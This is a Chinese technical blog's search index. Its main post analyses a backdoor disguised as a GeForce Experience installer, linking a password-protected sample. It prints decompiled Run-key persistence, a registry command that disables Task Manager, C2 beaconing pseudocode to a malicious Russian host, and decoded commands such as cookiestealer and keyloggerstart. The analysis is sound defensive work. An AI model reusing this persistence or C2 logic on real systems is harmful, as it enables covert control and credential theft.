<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>编程训练</title>
      <link href="/2020/04/27/%E7%BC%96%E7%A8%8B%E8%AE%AD%E7%BB%83/"/>
      <url>/2020/04/27/%E7%BC%96%E7%A8%8B%E8%AE%AD%E7%BB%83/</url>
      
        <content type="html"><![CDATA[<p>更新编程训练中遇到的有趣的题目</p><h2 id="LeetCode"><a href="#LeetCode" class="headerlink" title="LeetCode"></a>LeetCode</h2><p><a href="https://leetcode-cn.com/problems/qiu-12n-lcof/" target="_blank" rel="noopener">LeetCode面试题64</a><br>求1+2+……+n，不可使用if、while、switch、for、else以及条件判断语句（A？B：C）  </p><pre><code class="python">class Solution:    def sumNums(self, n: int) -&gt; int:        return sum(range(1,n+1))</code></pre><p>没想到C++的写法，参考他人答案</p><pre><code class="c++">class Solution {public:    int sumNums(int n) {        n &amp;&amp; (n += sumNums(n-1));        return n;    }};</code></pre><p>用到了 A&amp;&amp;B：  </p><ol><li>当A为True时，计算并返回B的bool值</li><li>当A为False时，直接返回False<br>与以往的迭代不同，它没有写在return语句中</li></ol>]]></content>
      
      
      <categories>
          
          <category> 基础编程 </category>
          
          <category> 编程训练 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Code </tag>
            
            <tag> C\C++ </tag>
            
            <tag> Python </tag>
            
            <tag> Leetcode </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>程序员的自我修养</title>
      <link href="/2020/04/27/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB/"/>
      <url>/2020/04/27/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB/</url>
      
        <content type="html"><![CDATA[<h1 id="1-温故而知新"><a href="#1-温故而知新" class="headerlink" title="1.温故而知新"></a>1.温故而知新</h1><p><code>计算机科学领域的任何一个问题都可以通过增加一个间接的中间层来解决</code><br><code>Any Problem in Computer science can be solved by another layer of indirection.</code></p><h2 id="分段与分页"><a href="#分段与分页" class="headerlink" title="分段与分页"></a>分段与分页</h2><h3 id="分段与分页-1"><a href="#分段与分页-1" class="headerlink" title="分段与分页"></a>分段与分页</h3><p>最初始的内存分配方案（直接线性的分配物理内存）主要存在地址空间不隔离、内存使用效率低、程序的运行地址不确定三大问题，提出的‘中间层’解决方案就是虚拟地址<br>分段：<br>将用户程序地址空间划分为若干大小不等的段，每个段可以定义一组相对完整的逻辑信息。存储分配时，以段为单位，段与段在内存中可以不相邻，即离散分配<br>分页：<br>为了提高内存使用率，利用程序的局部性原理，把地址空间认为的划分为固定大小的页，对应的，物理内存也划分为与页大小相等的许多物理块。这个页、块对用户是透明的，看不见的。<br>页错误，是当虚拟内存的页找不到对应的物理内存块时产生的异常。</p><h3 id="物理地址、逻辑地址、虚拟地址"><a href="#物理地址、逻辑地址、虚拟地址" class="headerlink" title="物理地址、逻辑地址、虚拟地址"></a>物理地址、逻辑地址、虚拟地址</h3><p>物理地址：内存芯片级的单元寻址，由硬件电路控制其具体含义，用来访问物理内存<br>逻辑地址：程序在执行指令，访问数据的时候通过逻辑地址（相对地址）进行访问操作<br>虚拟地址：又称线性地址，是逻辑地址与物理地址转换的中间层。用来访问虚拟内存空间  </p><p>虚拟地址=程序基地址＋逻辑地址（相对地址）  </p><div align=center><img src="./1/物理地址与虚拟地址转换.png" alt="物理地址与虚拟地址转换" width="70%" height="70%"  /></div>随着物理内存的不断增加，单纯的再使用一个页表的话会使页面更加庞大，维护难度上升，查找难度增加，Linux中已经使用了4级页表。  <div align=center><img src="./1/Linux中的四级页表转换.png" alt="Linux中的四级页表转换" width="70%" height="70%"  /></div>CR3寄存器中保存着进程的PGD地址（Page Global Directory），每个进程都有自己的页目录地址，进程切换的时候由操作系统负责将页目录地址装入到CR3中，之后的地址翻译过程由MMU（Memory Management Unit）硬件完成  <h2 id="众人拾柴火焰高"><a href="#众人拾柴火焰高" class="headerlink" title="众人拾柴火焰高"></a>众人拾柴火焰高</h2><p>进程： 操作系统进行调度与资源分配的基本单元<br>线程： 轻量级进程，CPU进行调度和分派的基本单位，基本上不拥有资源，共享一个进程的所有资源<br>协程： 轻量级线程，协程的调度由用户控制，所以可以看做是原子操作。Python使用yield关键字的生成器函数就是一种协程的应用  </p><div align=center><img src="./1/进程与线程关系图.png" alt="进程与线程关系图" width="70%" height="70%"  /></div><table><thead><tr><th align="left">线程私有</th><th align="left">线程之间共享（进程所有）</th></tr></thead><tbody><tr><td align="left">● 局部变量<br>● 函数的参数<br>● 线程局部存储TLS数据（Thread Local Storage）</td><td align="left">● 全局变量<br>● 堆上的数据<br>● 函数里的静态变量<br>● 程序代码<br>● 打开的文件</td></tr></tbody></table><h1 id="2"><a href="#2" class="headerlink" title="2."></a>2.</h1>]]></content>
      
      
      <categories>
          
          <category> 其他相关 </category>
          
          <category> 读书笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> OS </tag>
            
            <tag> 编译、链接 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>最小HelloWorld尝试</title>
      <link href="/2020/04/21/%E6%9C%80%E5%B0%8FHelloWorld%E5%B0%9D%E8%AF%95/"/>
      <url>/2020/04/21/%E6%9C%80%E5%B0%8FHelloWorld%E5%B0%9D%E8%AF%95/</url>
      
        <content type="html"><![CDATA[<h1 id="C-C"><a href="#C-C" class="headerlink" title="C/C++"></a>C/C++</h1><p>实验环境：Ubuntu、GCC7.5.0<br>gcc编译选项：<code>-m32 -fno-stack-protector -z execstack -z norelro -O0</code>，关闭常见的防护，关闭优化，动态链接，生成32位可执行程序</p><h2 id="第一版-最常见的写法"><a href="#第一版-最常见的写法" class="headerlink" title="第一版-最常见的写法"></a>第一版-最常见的写法</h2><p>先写一个最为常见的HelloWorld</p><pre><code class="c">#include&lt;stdio.h&gt;int main(){    printf(&quot;Hello,World\n&quot;);    return 1;}</code></pre><p>编译最后大小为5284字节</p><h2 id="第二版-使用init段"><a href="#第二版-使用init段" class="headerlink" title="第二版-使用init段"></a>第二版-使用init段</h2><pre><code class="c++">#include&lt;stdio.h&gt;tatic void before_main(void) __attribute((constructor));static void before_main(void){    printf(&quot;Hello,World\n&quot;);}int main(){}</code></pre><p>编译之后大小为5372字节，比常见的写法还大，但是比全局变量初始化时打印字符5652字节小</p><h2 id="第三版-合并程序段"><a href="#第三版-合并程序段" class="headerlink" title="第三版-合并程序段"></a>第三版-合并程序段</h2>]]></content>
      
      
      <categories>
          
          <category> 基础编程 </category>
          
          <category> 编程训练 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Code </tag>
            
            <tag> C\C++ </tag>
            
            <tag> Shell </tag>
            
            <tag> Asm </tag>
            
            <tag> PE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SayHi</title>
      <link href="/2020/04/21/SayHi/"/>
      <url>/2020/04/21/SayHi/</url>
      
        <content type="html"><![CDATA[<p>项目地址：<a href="https://github.com/i1arn/SayHi" target="_blank" rel="noopener">github</a><br>本项目旨在构建一个能够构造TCP数据包的工具</p><h1 id="参考项目、链接"><a href="#参考项目、链接" class="headerlink" title="参考项目、链接"></a>参考项目、链接</h1><h2 id="hping"><a href="#hping" class="headerlink" title="hping"></a>hping</h2><h1 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h1><h2 id="OSI参考模型"><a href="#OSI参考模型" class="headerlink" title="OSI参考模型"></a>OSI参考模型</h2><div align=center><img src="./OSI七层参考模型.jpg" alt="OSI七层参考模型" width="70%" height="70%"  /></div>参考模型中，每一层使用邻近下层提供的接口，为临近的上层提供服务接口。  数据的封装是从上到下，由里到外，解析是从下往上，由外到里。 <pre><code class="javascript">var rebels = pilots.filter(function (pilot) {  return pilot.faction === &quot;Rebels&quot;;});var empire = pilots.filter(function (pilot) {  return pilot.faction === &quot;Empire&quot;;});</code></pre>]]></content>
      
      
      <categories>
          
          <category> 基础编程 </category>
          
          <category> 造轮子 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Code </tag>
            
            <tag> C\C++ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>恶意程序分析(1)</title>
      <link href="/2020/04/14/%E6%81%B6%E6%84%8F%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90-1/"/>
      <url>/2020/04/14/%E6%81%B6%E6%84%8F%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90-1/</url>
      
        <content type="html"><![CDATA[<p><a href="./GeforceExpirience.bin.zip">后门程序,解压密码：infected</a></p><h1 id="程序"><a href="#程序" class="headerlink" title="程序"></a>程序</h1><p><a href="https://app.any.run/tasks/af63aed4-dfc0-4312-9d69-ae7502a2cb3b/" target="_blank" rel="noopener">app.any.run</a><br>程序来源于在线沙箱runany，在沙箱对程序进行了简单的运行，最直观的反应是不断的在打开cmd窗口。</p><div align=center><img src="./运行流程.png" alt="运行流程" width="70%" height="70%"  /></div>`Geforce Expirience.exe`图标与显卡程序驱动相似。PEID显示存在upx压缩壳,而DetectItEasily分析过后个人怀疑是个自解压运行程序，于是后缀改成rar得到了一些其他程序。在解压缩软件打开之后确认了该文件为自解压程序。  <div align=center><img src="./自解压程序.png" alt="自解压程序" width="70%" height="70%"  /></div>而dclib文件夹中的文件是一些库   <div align=center><img src="./dclib文件夹.png" alt="dclib文件夹" width="70%" height="70%"  /></div><p>所谓的<code>vmcheck32.dll</code>文件也并不是dll文件，其中保存了一些base64编码，解码之后看到了与anyrun中相同的域名。</p><h1 id="开始分析"><a href="#开始分析" class="headerlink" title="开始分析"></a>开始分析</h1><p>沙箱中的开始于<code>System.vbe</code>和<code>Starter.exe</code>，程序都使用了<code>.net reactor</code>加壳保护，我们尝试使用了<code>de4dot</code>进行脱壳。</p><h2 id="System-vbe"><a href="#System-vbe" class="headerlink" title="System.vbe"></a>System.vbe</h2><p>Google知vbe是vbs编码之后的代码，为的就是防止识别，于是尝试利用一些现有的脚本来直接解码<br><a href="./scriptDecode.vbs">vbe-decoder</a></p><div align=center><img src="./Systemvbe解码之后.png" alt="System.vbe解码之后" width="70%" height="70%"  /></div>很明显的看出，vbs脚本创建了一个快捷方式并运行了一个bat脚本与一个程序<h3 id="e6ee5674bb9446c78bbc5729af6e2c28-exe"><a href="#e6ee5674bb9446c78bbc5729af6e2c28-exe" class="headerlink" title="e6ee5674bb9446c78bbc5729af6e2c28.exe"></a>e6ee5674bb9446c78bbc5729af6e2c28.exe</h3><pre><code class="c#">using (RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(&quot;SYSTEM\\CurrentControlSet\\Control\\Class\\{6BDD1FC6-810F-11D0-BEC7-08002BE2092F}&quot;)){    foreach (string item in from x in registryKey.GetSubKeyNames()        where Regex.IsMatch(x, &quot;[0-9]{4}&quot;)        select x)    {        using (RegistryKey registryKey2 = registryKey.OpenSubKey(item))        {            registryKey2.SetValue(&quot;&quot;, 8, RegistryValueKind.DWord);          }    }}//……</code></pre><p>根据<a href="https://docs.microsoft.com/en-us/windows-hardware/drivers/install/hklm-system-currentcontrolset-control-registry-tree" target="_blank" rel="noopener">microsoft的说法</a>class目录下对应的是各个设置类别的GUID，而其中存放着设备的相关配置。</p><h3 id="bat脚本"><a href="#bat脚本" class="headerlink" title="bat脚本"></a>bat脚本</h3><p>其中bat文件中有效指令只有<code>&quot;C:\system32\svchost.exe&quot; &amp; reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_DWORD /d 1 /f</code>，其中是执行svchost程序，然后添加注册表</p><h4 id="svchost-exe"><a href="#svchost-exe" class="headerlink" title="svchost.exe"></a>svchost.exe</h4><p>这个程序运行使用在本地环境运行不起来，以为是反虚拟机调试，但是后来注意到是网络不通的问题。通过沙箱中的dns解析发现了‘ipinfo.io’、‘srv164667.hoster-test.ru’等在本地连接不成功，于是代理搬梯子准备分析调试。<br>所有程序、库都脱壳成功了，但是就是它失败。硬着头皮使用<code>dnSpy</code>进行调试。发现了些许内容  </p><pre><code class="python">#伪代码BaseUrl=&quot;http://srv164667.hoster-test.ru/t7rsexe3q8gjyon4o9o2p6iuzs1nv8ll5jys37mvg3nftujfj7p80zdfgwa/h0sezt8ofjrez/&quot;TestUrl=BaseUrl+&quot;srxaikiy9svo9bip1tqpu5rem3lln9zw8vgjsk7ldnc13bk2&quot;TargetUrl=BaseUrl+md5(TestUrl)+&quot;.php&quot;connect(TargetUrl+&quot;?&quot;+md5(&quot;srv164667.hoster-test.ru&quot;+&quot;password&quot;)+&quot;=c&quot;)#返回{&quot;status&quot;:&quot;UP&quot;}，猜测用来检查服务器状态token=connect(TargetUrl+&quot;?&quot;+&quot;some unknown args&quot;)#之后的所有网络交互都有参数“11b7d19ccf1147a7a18c5d8cb8fb6bc4 = reverse(base64(token))”</code></pre><p>在了解了参数内容为base64编码之后，手动解析了几个参数，发现了上传系统进程等等一些内容，同时在请求的结果中也发现了base64编码之后的一些命令。</p><div align=center><img src="./逆序base64解码.png" alt="逆序base64解码" width="70%" height="70%"  /></div><p>几天之后再尝试去分析时，发现原本的服务器已经挂了，无奈为了继续分析程序，手动搭建了一个简单的web服务。好在请求返回的结果基本上不多，在host文件中将恶意网址指向本地（使用AtapeDNS后导致恶意程序的其他网络请求失败）。<br>程序中运行这多个线程，采用不断冻结线程的方法一个一个去观察，同时呢为了使命令执行的效果更加方便且不产生更多的线程，返回中的command命令选用了forkbomb。经过多日努力跟踪分析，终于有了进展。。。  </p><div align=center><img src="./程序运行的多个线程.png" alt="程序运行的多个线程" width="70%" height="70%"  /></div><div align=center><img src="./FrokBomb命令执行.png" alt="FrokBomb命令执行" width="70%" height="70%"  /></div>通过断点Base64解码与正则匹配，逐个分析了线程之后找到了命令执行的关键线程  <div align=center><img src="./命令匹配.png" alt="命令匹配" width="70%" height="70%"  /></div>找到了命令匹配的地方，很快就有了命令的执行的过程了，首先是将命令按照一定的计算方法转换为整数  <div align=center><img src="./命令转换.png" alt="命令转换" width="70%" height="70%"  /></div>紧接着，根据转换结果来选择执行代码  <div align=center><img src="./根据命令转换结果执行.png" alt="根据命令转换结果执行" width="70%" height="70%"  /></div><p>分析过程中发现，请求的返回结果解码之后至少包含三种数据格式，至于已经发现的另外两种就没精力研究是啥作用了。。。</p><h5 id="注册表"><a href="#注册表" class="headerlink" title="注册表"></a>注册表</h5><p><code>HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System</code>的操作是将任务管理器禁用了，其中<code>HKCU</code>就是<code>HKEY_CURRNET_USER</code><br>补充一条相关路径： <code>HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\policies\system</code></p><h2 id="Starter-exe"><a href="#Starter-exe" class="headerlink" title="Starter.exe"></a>Starter.exe</h2><pre><code class="c#">Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);  //获取用户的应用数据目录，此处为“C:\Users\i1arn\AppData\Roaming”//……//复制程序到了相关文件夹中//……string executablePath = Application.ExecutablePath;RegistryKey registryKey = Registry.CurrentUser.CreateSubKey(&quot;Software\\Microsoft\\Windows\\CurrentVersion\\Run\\&quot;);registryKey.SetValue(&quot;Adobe QuikInstall&quot;, folderPath + &quot;\\Adobe\\Adobe QuikInstall.exe&quot;);   //设置自启程序registryKey.Close();Thread.Sleep(10000);File.Copy(currentDirectory + &quot;\\System.vbe&quot;, folderPath + &quot;\\NotePad\\System.vbe&quot;);Process.Start(folderPath + &quot;\\Adobe\\Adobe QuikInstall.exe&quot;);   //启动`Adobe QuikInstall.exe`</code></pre><h3 id="Adobe-QuikInstall-exe"><a href="#Adobe-QuikInstall-exe" class="headerlink" title="Adobe QuikInstall.exe"></a>Adobe QuikInstall.exe</h3><p>看名字像是Adobe安装软件，其实……</p><pre><code class="C#">process.StartInfo.FileName = &quot;cmd.exe&quot;;process.StartInfo.Arguments = &quot;/C &quot; + folderPath + &quot;\\Obsidium\\Runtime Broker.exe&quot;;    process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;process.Start();//……//顺序启动了“Runtime Broker.exe”、“SecurityHealthService.exe”、“YourPhone.exe”</code></pre><p>正常系统中：  </p><ol><li><code>Runtime Broker.exe</code>用来进行开始屏幕磁贴与桌面的后台交互  </li><li><code>SecurityHealthService.exe</code>由微软提供的安全服务</li><li><code>YourPhone.exe</code>微软在Windows10上发布的新应用，便于用户访问手机上的内容<br>三个程序在此处都是重复不断的创建<code>C:/Media</code>目录并启动<code>C:/Media/fontreview.exe</code>程序。</li></ol><h3 id="fontreview-exe"><a href="#fontreview-exe" class="headerlink" title="fontreview.exe"></a>fontreview.exe</h3><p>多种环境多次运行之后都未能发现该文件</p><h1 id="数据包分析"><a href="#数据包分析" class="headerlink" title="数据包分析"></a>数据包分析</h1><p>通过Python脚本获取到了请求中的URL参数并对其进行了解析。</p><pre><code class="Python">import scapyimport scapy_http.httpimport re，json，base64，collectionsfrom urllib import parseargs=collections.defaultdict(list)packets=scapy.rdpcap(&quot;./af63aed4-dfc0-4312-9d69-ae7502a2cb3b.pcap&quot;)for i in packets:    try:        data=re.split(&quot;[?&amp;]&quot;,i.getlayer(&quot;HTTPRequest&quot;).Path.decode())        for arg in data[1:]:            argname,argval=arg.split(&quot;=&quot;)            argval=base64.b64decode(parse.unquote(argval)[::-1]).decode()            if argval not in args[argname]:                args[argname].append(argval)  #旨在去除重复参数值。无法使用set，格式化打印时出错    except Exception as e:        passargs=json.dumps(args,indent=1)print(args)</code></pre><p>从结果中直观的看见实际上参数就几个，能够直接看出相关意义的不多。</p><pre><code class="bash">{ &quot;11b7d19ccf1147a7a18c5d8cb8fb6bc4&quot;: [  &quot;09ee87aef1bcd074085f36668392f85e262716383&quot; ], &quot;248854911a064ebaa582d1a56b380dcf&quot;: [  &quot;af5ed1d2b30ebda301fbc7e20bfcd0f27de9529b&quot; ], &quot;56367c166cecf6b4c653b02521db5738&quot;: [  &quot;COMMAND::&lt;cookiestealer&gt;-DATA::&lt;&gt;&quot;,  &quot;COMMAND::&lt;keyloggerstart&gt;-DATA::&lt;&gt;&quot;,  &quot;Microphone (Realtek AC&#39;97 Audio\r\nLine In (Realtek AC&#39;97 Audio)\r\n&quot;,  &quot;ServerType:C#,ServerVer:0.2.25,isMicrophone:Y,isWebcam:N,isAdmin:Y&quot;,  &quot;ServerType:C#,ServerVer:0.2.25,isMicrophone:Y,isWebcam:N,isAdmin:Y,WinVer:Windows 7 Professional ,ACTWindow:Program Manager,PCName:USER-PC,UserName:admin,IpInfo:81.17.242.238\n&quot;,  &quot;&quot;,  &quot;done&quot;,  &quot;C:\\Users\\admin\\AppData\\Roaming\\discord\\Local Storage\\&quot;,  &quot;N/A&quot;,  &quot;Login:gabriel_radrigos,Path:c:/program files/steam,Language:,steamID:&quot;,  &quot;4.7.2&quot;,  &quot;ProcName:Intel(R) Core(TM) i5-6400 CPU @ 2.70GHz,ProcessorDescription:x86 Family 6 Model 94 Stepping 3, GenuineIntel,ProcessorArch:x86,ProcessorModel:6,NumberOfLogicalProcessors:4,BIOSVersion:DELL  - 1,BIOSManufacturer:DELL,MotherboardManufacturer:N/A,MotherboardProduct:N/A,MotherboardSerial:N/A,VideoProduct:Standard VGA Graphics Adapter,VideoDriverVer:N/A,VideoRAM:N/A B,VideoRes:1280 x 720,AV:N/A,Path:C:\\system32&quot;,  &quot;Name:C:\\,Type:Drive,Size:274770948096&lt;STR&gt;&quot;,  &quot;ServerType:C#,ServerVer:0.2.25,isMicrophone:Y,isWebcam:N,isAdmin:Y,WinVer:Windows 7 Professional ,ACTWindow:C:\\Windows\\System32\\cmd.exe,PCName:USER-PC,UserName:admin,IpInfo:81.17.242.238\n&quot;,  &quot;ServerType:C#,ServerVer:0.2.25,isMicrophone:Y,isWebcam:N,isAdmin:Y,WinVer:Windows 7 Professional ,ACTWindow:C:\\Windows\\system32\\cmd.exe,PCName:USER-PC,UserName:admin,IpInfo:81.17.242.238\n&quot;,  &quot; &quot; ], &quot;95b18fce3c280a84c447b7374258cd3b&quot;: [  &quot;552b13e67562d7b564b8a0ac9f35c735d17c786b&quot; ], &quot;fb668fe31be77ee0a010de83c225c204&quot;: [  &quot;fd4fbcdbaa1148ef9963f5e0be6ac85a&quot;,  &quot;454fa6055bad2c4e9b1d33b0b30b11eb&quot;,  &quot;ee678cc6ced5600710e600f5c8cce48e&quot;,  &quot;f8afc49efff2cc16b83e646c95b9e989&quot;,  &quot;957acf4c4fcce89f764055acf9978456&quot;,  &quot;f20d8d958ee4f8643f1b069f8db495c2&quot;,  &quot;c72a0133882ce6233c90990b8e00775c&quot;,  &quot;5d94deb0da6c64342915be998ce7d95f&quot;,  &quot;0d55fc65bc0ac96872fab9bc03ec0134&quot;,  &quot;df4a7df5bb1d10900476bed933716663&quot;,  &quot;27ef1b29586798bc372642cf969b2187&quot;,  &quot;3ceba6076b11c5db73cc14cc308a91a2&quot;,  &quot;273f06e7eb1000c68f3fe62d51cd3779&quot;,  &quot;d182f4586cab8bae2bde9ae10eb120c8&quot;,  &quot;b785a88a74f90c8913744c7ba92d0be5&quot; ], &quot;0e1f102a661f322dc855ed186f235900&quot;: [  &quot;552b13e67562d7b564b8a0ac9f35c735d17c786b&quot; ], &quot;156fde0665d178eece714785060d9d42&quot;: [  &quot;b785a88a74f90c8913744c7ba92d0be5&quot;,  &quot;fd4fbcdbaa1148ef9963f5e0be6ac85a&quot; ]}{   &quot;11b7d19ccf1147a7a18c5d8cb8fb6bc4&quot;: [      &quot;09ee87aef1bcd074085f36668392f85e262716383&quot;   ],   &quot;248854911a064ebaa582d1a56b380dcf&quot;: [      &quot;af5ed1d2b30ebda301fbc7e20bfcd0f27de9529b&quot;   ],   &quot;56367c166cecf6b4c653b02521db5738&quot;: [      &quot;COMMAND::&lt;cookiestealer&gt;-DATA::&lt;&gt;&quot;,      &quot;COMMAND::&lt;keyloggerstart&gt;-DATA::&lt;&gt;&quot;,      &quot;Microphone (Realtek AC&#39;97 Audio\r\nLine In (Realtek AC&#39;97 Audio)\r\n&quot;,      &quot;ServerType:C#,ServerVer:0.2.25,isMicrophone:Y,isWebcam:N,isAdmin:Y&quot;,      &quot;ServerType:C#,ServerVer:0.2.25,isMicrophone:Y,isWebcam:N,isAdmin:Y,WinVer:Windows 7 Professional ,ACTWindow:Program Manager,PCName:USER-PC,UserName:admin,IpInfo:81.17.242.238\n&quot;,      &quot;&quot;,      &quot;done&quot;,      &quot;C:\\Users\\admin\\AppData\\Roaming\\discord\\Local Storage\\&quot;,      &quot;N/A&quot;,      &quot;Login:gabriel_radrigos,Path:c:/program files/steam,Language:,steamID:&quot;,      &quot;4.7.2&quot;,      &quot;ProcName:Intel(R) Core(TM) i5-6400 CPU @ 2.70GHz,ProcessorDescription:x86 Family 6 Model 94 Stepping 3, GenuineIntel,ProcessorArch:x86,ProcessorModel:6,NumberOfLogicalProcessors:4,BIOSVersion:DELL  - 1,BIOSManufacturer:DELL,MotherboardManufacturer:N/A,MotherboardProduct:N/A,MotherboardSerial:N/A,VideoProduct:Standard VGA Graphics Adapter,VideoDriverVer:N/A,VideoRAM:N/A B,VideoRes:1280 x 720,AV:N/A,Path:C:\\system32&quot;,      &quot;Name:C:\\,Type:Drive,Size:274770948096&lt;STR&gt;&quot;,      &quot;ServerType:C#,ServerVer:0.2.25,isMicrophone:Y,isWebcam:N,isAdmin:Y,WinVer:Windows 7 Professional ,ACTWindow:C:\\Windows\\System32\\cmd.exe,PCName:USER-PC,UserName:admin,IpInfo:81.17.242.238\n&quot;,      &quot;ServerType:C#,ServerVer:0.2.25,isMicrophone:Y,isWebcam:N,isAdmin:Y,WinVer:Windows 7 Professional ,ACTWindow:C:\\Windows\\system32\\cmd.exe,PCName:USER-PC,UserName:admin,IpInfo:81.17.242.238\n&quot;,      &quot; &quot;   ],   &quot;95b18fce3c280a84c447b7374258cd3b&quot;: [      &quot;552b13e67562d7b564b8a0ac9f35c735d17c786b&quot;   ],   &quot;fb668fe31be77ee0a010de83c225c204&quot;: [      &quot;fd4fbcdbaa1148ef9963f5e0be6ac85a&quot;,      &quot;454fa6055bad2c4e9b1d33b0b30b11eb&quot;,      &quot;ee678cc6ced5600710e600f5c8cce48e&quot;,      &quot;f8afc49efff2cc16b83e646c95b9e989&quot;,      &quot;957acf4c4fcce89f764055acf9978456&quot;,      &quot;f20d8d958ee4f8643f1b069f8db495c2&quot;,      &quot;c72a0133882ce6233c90990b8e00775c&quot;,      &quot;5d94deb0da6c64342915be998ce7d95f&quot;,      &quot;0d55fc65bc0ac96872fab9bc03ec0134&quot;,      &quot;df4a7df5bb1d10900476bed933716663&quot;,      &quot;27ef1b29586798bc372642cf969b2187&quot;,      &quot;3ceba6076b11c5db73cc14cc308a91a2&quot;,      &quot;273f06e7eb1000c68f3fe62d51cd3779&quot;,      &quot;d182f4586cab8bae2bde9ae10eb120c8&quot;,      &quot;b785a88a74f90c8913744c7ba92d0be5&quot;   ],   &quot;0e1f102a661f322dc855ed186f235900&quot;: [      &quot;552b13e67562d7b564b8a0ac9f35c735d17c786b&quot;   ],   &quot;156fde0665d178eece714785060d9d42&quot;: [      &quot;b785a88a74f90c8913744c7ba92d0be5&quot;,      &quot;fd4fbcdbaa1148ef9963f5e0be6ac85a&quot;   ]}</code></pre><p>其他参数值的计算方法就不过多的关注了，还是想看看具体能执行一些什么命令，有什么效果。</p><h1 id="说在最后"><a href="#说在最后" class="headerlink" title="说在最后"></a>说在最后</h1><p>程序的每一次运行效果并不完全相同，怀疑与后台设定的telegram机器人相关。第一次沙箱中运行之后开启了大量cmd窗口，在数据包中同时发现了<code>COMMAND::&lt;forkbomb&gt;-DATA::&lt;&gt;</code>编码之后的数据，之后重新运行未发生大量cmd窗口的情况，数据包中也未出现“forkbomb”相关字样。下图为某次本地运行之后的效果，恶意程序启动了系统中的一些程序来试图转移注意力</p><div align=center><img src="./本地某次运行效果.png" alt="本地某次运行效果" width="70%" height="70%"  /></div><h2 id="最后的最后"><a href="#最后的最后" class="headerlink" title="最后的最后"></a>最后的最后</h2><p>按照常理来说恶意软件分析应该重点关注程序的执行效果，带来的影响，但是此次分析研究了很多细节，ennn，第一次吧<br>现在已知的效果是修改了相关的注册表，复制了一个守护进程到了一些随机的目录，在本地数据库中写入了某些东西，盲猜与keylogger等相关吧。能否写一个专杀工具？。？</p>]]></content>
      
      
      <categories>
          
          <category> 逆向分析 </category>
          
          <category> 恶意程序分析 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Reverse </tag>
            
            <tag> Backdoor </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>恶意程序分析环境搭建</title>
      <link href="/2020/04/12/%E6%81%B6%E6%84%8F%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/"/>
      <url>/2020/04/12/%E6%81%B6%E6%84%8F%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/</url>
      
        <content type="html"><![CDATA[<h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><h2 id="环境搭建-1"><a href="#环境搭建-1" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>使用Windows10搭建了一个分析环境，inetsim直接安装在了WSL上，因为两个系统公用一个ip所以无需更多配置。ApateDNS的返回ip填写<code>127.0.0.1</code>即可。</p><h2 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h2><p>因为两个系统公用一套端口，而inetsim也提供DNS服务，有冲突，可能使ApateDNS获取不到DNS请求，两种解决办法：</p><ol><li>优先打开ApateDNS，再打开Linux的inetsim服务。</li><li>再配置文件<code>/etc/inetsim/inetsim.conf</code>中注释掉<code>start_service dns</code>，关闭其dns服务</li></ol><h1 id="虚拟机文件"><a href="#虚拟机文件" class="headerlink" title="虚拟机文件"></a>虚拟机文件</h1><p><a href="https://pan.baidu.com/s/1H0IoC3-5OyRQfWJy6D4XAw" target="_blank" rel="noopener">百度云</a><br>提取码：14uu </p>]]></content>
      
      
      <categories>
          
          <category> 逆向分析 </category>
          
          <category> 恶意程序分析 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Reverse </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>gdb自动化调试举例</title>
      <link href="/2020/04/08/gdb%E8%87%AA%E5%8A%A8%E5%8C%96%E8%B0%83%E8%AF%95%E4%B8%BE%E4%BE%8B/"/>
      <url>/2020/04/08/gdb%E8%87%AA%E5%8A%A8%E5%8C%96%E8%B0%83%E8%AF%95%E4%B8%BE%E4%BE%8B/</url>
      
